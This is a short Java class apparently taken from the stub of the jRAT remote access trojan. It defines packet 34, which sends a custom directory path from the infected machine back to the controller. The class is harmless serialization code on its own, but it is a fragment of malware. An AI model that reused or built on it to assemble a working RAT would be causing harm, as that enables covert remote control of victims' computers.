package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet34CustomDirectory extends AbstractOutgoingPacket {

	private String location;
	
	public Packet34CustomDirectory(String location) {
		this.location = location;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.location);
	}

	@Override
	public byte getPacketId() {
		return 34;
	}

}
